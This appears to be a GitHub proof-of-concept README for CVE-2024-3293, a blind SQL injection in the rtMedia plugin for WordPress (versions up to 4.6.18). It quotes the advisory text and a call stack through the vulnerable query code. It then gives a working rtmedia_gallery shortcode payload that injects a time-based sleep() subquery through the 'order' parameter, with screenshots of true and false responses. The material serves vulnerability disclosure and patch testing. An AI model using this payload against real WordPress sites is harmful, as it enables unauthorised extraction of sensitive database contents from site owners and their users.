# CVE-2024-3293-Poc

rtMedia for WordPress, BuddyPress and bbPress <= 4.6.18 - Authenticated (Contributor+) SQL Injection via rtmedia_gallery Shortcode

Description

The rtMedia for WordPress, BuddyPress and bbPress plugin for WordPress is vulnerable to blind SQL Injection via the rtmedia_gallery shortcode in all versions up to, and including, 4.6.18 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for authenticated attackers, with contributor-level access and above, to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/buddypress-media/rtmedia-for-wordpress-buddypress-and-bbpress-4618-authenticated-contributor-sql-injection-via-rtmedia-gallery-shortcode

CALL STACK
```
RTMediaModel->get (\buddypress-media\app\helper\RTMediaModel.php:61)
RTMediaModel->get_media (\buddypress-media\app\helper\RTMediaModel.php:227)
RTMediaQuery->populate_media (\buddypress-media\app\main\routers\query\RTMediaQuery.php:869)
RTMediaQuery->populate_data (\buddypress-media\app\main\routers\query\RTMediaQuery.php:993)
RTMediaQuery->get_data (\buddypress-media\app\main\routers\query\RTMediaQuery.php:1214)
RTMediaQuery->query (\buddypress-media\app\main\routers\query\RTMediaQuery.php:684)
RTMediaQuery->__construct (\buddypress-media\app\main\routers\query\RTMediaQuery.php:184)
RTMediaGalleryShortcode::render (\buddypress-media\app\main\controllers\shortcodes\RTMediaGalleryShortcode.php:271)
```

Payload: 
```
[rtmedia_gallery global="true" album_id="57" order_by="ratings" order=",media_id,(select 1 from (select sleep(IF(1=1,5,0)))x)"]
```

![image](https://github.com/truonghuuphuc/CVE-2024-3293-Poc/assets/20487674/349f1bfa-eef6-4757-a3c8-c976866927af)

![image](https://github.com/truonghuuphuc/CVE-2024-3293-Poc/assets/20487674/3be5f3bf-2338-4888-b7cf-1fb60443b2a1)

Payload true:

![image](https://github.com/truonghuuphuc/CVE-2024-3293-Poc/assets/20487674/cb9d5c18-94cc-4082-8ed8-9ad46f11a622)

Payload false:

![image](https://github.com/truonghuuphuc/CVE-2024-3293-Poc/assets/20487674/31a2d8e4-9383-4df5-8dd3-9e5748c3e24c)

